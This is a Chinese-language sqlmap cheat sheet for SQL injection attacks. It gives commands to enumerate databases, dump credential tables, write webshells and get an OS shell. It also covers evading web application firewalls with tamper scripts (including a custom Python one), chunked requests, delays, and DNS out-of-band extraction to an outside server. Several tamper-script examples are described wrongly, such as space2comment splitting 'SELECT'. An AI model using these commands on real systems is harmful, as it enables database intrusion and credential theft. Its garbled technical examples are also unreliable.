# 枚举数据库
`--dbs` → 枚举所有数据库

# 枚举表
`--tables -D 数据库名字` → 枚举更多表

# 看内容
`--dump -T 表名 -D 数据库名` → 查找用户凭据
# 写webshell
`--os-shell` 或 `--file-write` → 尝试写入 WebShell
# 检查权限
`--privileges` → 检查当前数据库用户权限（是否能读写文件）

# 自动化运行
`--batch`
# waf绕过

##  基础使用方法

1. `sqlmap -u "http://target.com/page?id=1" --tamper=space2comment`

该命令使用`space2comment`脚本将空格替换为`/**/`注释，将`SELECT * FROM users`转换为`SEL/**/ECT*/**/FROM/**/users`。

##  多脚本组合策略

1. `sqlmap -u "target" --tamper="randomcase,space2comment,equaltolike"`

组合使用三个脚本实现：

1. `randomcase`：随机大小写转换
2. `space2comment`：空格注释化
3. `equaltolike`：将`=`替换为`LIKE`

##  自定义脚本开发

创建`mytamper.py`文件：

1. `from lib.core.enums import PRIORITY`
2. `__priority__ = PRIORITY.NORMAL`

3. `def dependencies():`
4.     `pass`

5. `def tamper(payload, **kwargs):`
6.     `if payload:`
7.         `return payload.replace("=", " LIKE ").replace("AND", "&&")`
8.     `return payload`

通过`--tamper=mytamper`加载自定义脚本，实现等价符号替换。

## 3.1 编码类脚本

1. **charunicodeencode**：将ASCII字符转为Unicode编码
    
    1. `-- 原payload: SELECT * FROM users`
    2. `-- 转换后: \u0053\u0045\u004c\u0045\u0043\u0054 * FROM users`
    
2. **charencode**：URL编码每个字符
    
    1. `-- 原payload: admin' --`
    2. `-- 转换后: %61%64%6d%69%6e%27%20%2d%2d`
    

## 3.2 混淆类脚本

1. **randomcase**：随机大小写转换
    
    1. `-- 原payload: UNION SELECT 1,2,3`
    2. `-- 转换后: UnIoN SeLeCt 1,2,3`
    
2. **space2comment**：空格替换为注释
    
    1. `-- 原payload: SELECT * FROM users`
    2. `-- 转换后: SEL/**/ECT*/**/FROM/**/users`
    

## 3.3 逻辑替换类

1. **equaltolike**：等号替换为LIKE
    
    1. `-- 原payload: id=1`
    2. `-- 转换后: id LIKE 1`
    
2. **greatest**：使用GREATEST函数替代OR逻辑
    
    1. `-- 原payload: 1 OR 1=1`
    2. `-- 转换后: GREATEST(1,1)=1`
    

## 3.4 特殊处理类

1. **apostrophenullencode**：单引号替换为`%00`
    
    1. `-- 原payload: admin' AND 1=1`
    2. `-- 转换后: admin%00 AND 1=1`
    
2. **multiplespaces**：多个空格替换为单个空格
    
    1. `-- 原payload: SELECT    * FROM users`
    2. `-- 转换后: SELECT * FROM users`
    

# 四、进阶绕过技术

## 4.1 分块传输绕过

结合`chunked`选项实现请求体分块传输：

1. `sqlmap -u "target" --chunked --tamper="space2comment"`

将payload拆分为多个HTTP块传输，规避长度检测。

## 4.2 延迟注入技术

使用`--delay=2`参数添加请求间隔，配合`--safe-url`设置备用检测点：

1. `sqlmap -u "target" --delay=2 --safe-url="http://target.com/safe"`

## 4.3 DNS外带检测

配置DNS日志服务器后使用`--dns-domain`参数：

1. `sqlmap -u "target" --dns-domain="your.server.com" --tamper="randomcase"`

通过DNS查询验证注入结果，避免页面回显检测。






















